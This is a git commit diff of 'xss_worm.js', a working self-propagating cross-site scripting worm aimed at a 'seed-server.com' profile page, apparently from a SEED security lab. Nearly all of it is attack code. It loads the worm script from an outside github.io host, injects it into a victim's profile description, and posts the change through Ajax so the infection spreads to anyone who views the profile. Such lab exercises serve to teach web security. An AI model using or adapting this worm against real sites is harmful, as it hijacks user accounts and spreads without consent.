0a7f17a2f06bc41c964e43e0e350de7b1724b715
n1ck <nateyzbzzz@gmail.com>
2024-09-14 05:13:08 +0800

    Update xss_worm.js

--- xss_worm.js
+++ xss_worm.js
@@ -1,25 +1,25 @@
-// The worm code that will be injected into the victim's profile
 window.onload = function() {
-    // Define the worm code that will be injected
+    // Define the worm code to be injected into the victim's profile
     var wormCode = encodeURIComponent(
-        "<script type=\"text/javascript\" id=\"worm\" " +
-        "src=\"https://n1ck-n4m3.github.io/js/xss_worm.js\">" +
+        "<script type=\"text/javascript\" " +
+        "id=\"worm\" " +
+        "src=\"https://n1ck-n4m3.github.io/js/xss_worm.js\">" + 
         "</" + "script>"
     );
 
-    // Construct the description field for the victim's profile
+    // Construct the description field with the worm code
     var desc = "&description=Samy is my hero " + wormCode;
-    desc += "&accesslevel[description]=2";  // Set description access level
+    desc += "&accesslevel[description]=2";  // Set the access level of the description field
 
-    // URL for sending the profile modification request
-    var sendurl = "http://www.seed-server.com/action/profile/edit";  // Update with correct URL
+    // Fixed URL to modify the profile (you can replace 'alice' with any user's profile edit URL)
+    var sendurl = "http://www.seed-server.com/profile/alice/edit"; 
 
     // Create and send the Ajax POST request to modify the victim's profile
     var Ajax = new XMLHttpRequest();
     Ajax.open("POST", sendurl, true);
     Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-    Ajax.send(desc);  // Send the modified description with the worm
+    Ajax.send(desc); 
 
-    // Optional: Notify that the worm has updated the profile
-    console.log("Worm successfully injected and profile updated!");
+    // Optional: Console log for debugging
+    console.log("Worm successfully injected and profile updated.");
 };
